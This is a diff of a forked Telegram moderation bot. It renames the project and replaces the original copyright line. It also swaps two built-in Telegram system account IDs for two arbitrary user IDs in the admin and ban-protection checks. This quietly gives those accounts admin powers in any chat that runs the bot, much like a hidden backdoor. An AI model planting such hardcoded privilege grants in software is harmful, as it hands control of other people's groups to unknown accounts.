@@ -1,5 +1,5 @@
-# UserindoBot
-# Copyright (C) 2020  UserindoBot Team, <https://github.com/userbotindo/UserIndoBot.git>
+# Nisabot
+# Copyright (C) 2021 I Do Not Know, <https://github.com/agung267/NEWNISA.git>
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -18,7 +18,7 @@ from functools import wraps
 from telegram import User, Chat, ChatMember
 from telegram.error import BadRequest, Unauthorized
 
-from ubotindo import (
+from nisabot import (
     DEL_CMDS,
     DEV_USERS,
     SUDO_USERS,
@@ -46,7 +46,7 @@ def is_user_ban_protected(
         or user_id in SUDO_USERS
         or user_id in WHITELIST_USERS
         or chat.all_members_are_administrators
-        or user_id in (777000, 1087968824)
+        or user_id in (1330133497, 1154565101)
     ):
         return True
 
@@ -60,7 +60,7 @@ def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
         chat.type == "private"
         or user_id in DEV_USERS
         or user_id in SUDO_USERS
-        or user_id in (777000, 1087968824)
+        or user_id in (1330133497, 1154565101)
         or chat.all_members_are_administrators
     ):
         return True
